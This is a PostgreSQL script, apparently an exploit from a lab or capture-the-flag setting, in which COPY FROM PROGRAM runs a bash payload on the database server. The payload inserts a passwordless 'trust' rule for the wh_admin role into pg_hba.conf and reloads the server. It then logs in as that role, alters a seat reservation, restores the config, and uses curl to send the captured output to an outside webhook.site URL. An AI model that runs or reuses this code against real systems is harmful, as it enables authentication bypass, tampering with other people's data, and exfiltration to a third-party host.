BEGIN;
CREATE TEMP TABLE c(line text);
TRUNCATE c;

COPY c FROM PROGRAM $$/bin/bash -c '
set -euo pipefail;

HBA_CONF="/var/lib/postgresql/data/pg_hba.conf";
PG_DATA="/var/lib/postgresql/data";
PG_SOCK="/var/run/postgresql";
PG_BIN_DIR="/usr/lib/postgresql/17/bin";
DB_NAME="wh_air";
WEBHOOK_URL="https://webhook.site/ba2e4353-5298-4ad4-8794-a7ab27cc20af";
TARGET_USER="wh_admin";
TARGET_USER_ID=2;
TMP_FILE=$(mktemp);
{
  echo "--- HBA PATCH: Prepending a trust rule for ${TARGET_USER} ---";
  cp -a "${HBA_CONF}" "${HBA_CONF}.bak";
  
  sed -i "1ilocal all ${TARGET_USER} trust" "${HBA_CONF}";
  echo "[+] HBA file modified.";

  echo "[*] Reloading PostgreSQL configuration...";
  "${PG_BIN_DIR}/pg_ctl" reload -D "${PG_DATA}";
  sleep 1;

  echo;
  echo "--- CONNECT AS ${TARGET_USER} (unix socket) ---";
  "${PG_BIN_DIR}/psql" -h "${PG_SOCK}" -U "${TARGET_USER}" -d "${DB_NAME}" -At \
    -c "SELECT ''Connection successful!'', current_user, session_user, current_database()";

  echo;
  echo "--- EXECUTE UPDATE AS ${TARGET_USER} ---";
  "${PG_BIN_DIR}/psql" -h "${PG_SOCK}" -U "${TARGET_USER}" -d "${DB_NAME}" -v ON_ERROR_STOP=1 -q \
    -c "UPDATE public.reservations SET seat_id = 1 WHERE user_id = ${TARGET_USER_ID};";
  echo "[+] Update command executed.";

  echo;
  echo "--- VERIFY ---";
  echo "Reservation for user ${TARGET_USER_ID}:";
  "${PG_BIN_DIR}/psql" -h "${PG_SOCK}" -U "${TARGET_USER}" -d "${DB_NAME}" -At \
    -c "SELECT seat_id FROM public.reservations WHERE user_id=${TARGET_USER_ID}";
  
  echo "State of seat #1:";
  "${PG_BIN_DIR}/psql" -h "${PG_SOCK}" -U "${TARGET_USER}" -d "${DB_NAME}" -At \
    -c "SELECT id, class, is_reserved FROM public.seats WHERE id=1";

  echo;
  echo "--- RESTORE HBA ---";
  mv "${HBA_CONF}.bak" "${HBA_CONF}";
  
  "${PG_BIN_DIR}/pg_ctl" reload -D "${PG_DATA}";
  echo "[+] HBA restored and configuration reloaded. Recon complete.";

} > "${TMP_FILE}" 2>&1 || true;

if [ -n "${WEBHOOK_URL}" ]; then
    /usr/bin/curl -sS -X POST --data-binary @"${TMP_FILE}" "${WEBHOOK_URL}" >/dev/null || true;
fi;
cat "${TMP_FILE}";
rm -f "${TMP_FILE}";
'$$;

SELECT * FROM c;
COMMIT;
